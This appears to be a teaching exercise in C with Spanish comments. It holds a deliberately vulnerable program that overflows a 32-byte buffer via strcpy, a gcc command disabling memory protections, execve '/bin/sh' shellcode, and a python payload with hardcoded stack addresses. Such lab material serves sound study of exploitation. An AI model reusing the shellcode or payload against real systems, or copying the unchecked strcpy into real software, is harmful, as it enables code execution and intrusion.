// gcc -fno-stack-protector -D_FORTIFY_SOURCE=0 -z norelro -z execstack myTry.c -o myTry

// \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
#include <string.h>
#include <stdio.h>

void func(char *arg){
  char nombre[32];
  strcpy(nombre, arg);
  printf("\Bienvenido a Linux Exploting %s\n\n", nombre);
}
void func2(char *arg){
	func(arg);
}
int main(int argc, char *argv[]){
  if(argc !=2 ){
    printf("Uso: %s NOMBRE\n", argv[0]);
    exit(0);
  }
  func2(argv[1]);
  printf("Fin del programa \n\n");
  return 0;
}

//run `python -c 'print "A"*8 + "\x0C\xf3\xff\xbf" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A"*5 + "\x04\xf3\xff\xbf" + "\xe8\x05"'`
//Debido a que cuando C copia un string añade al final el caracter \x00 en este ataque este caracter sobreesvribiría la dirección de vueltadel primer ret (la dirección que hay justo despues de la memoria con la que se sobreescribirá el EBP), por lo que hay que hardcodear tambien esa dirección dentro del exploit. En este caso, como dentro de la dirección de vuelta del ret el 3º byte era \x00 se ahrdcodearon solo los dos primeros.
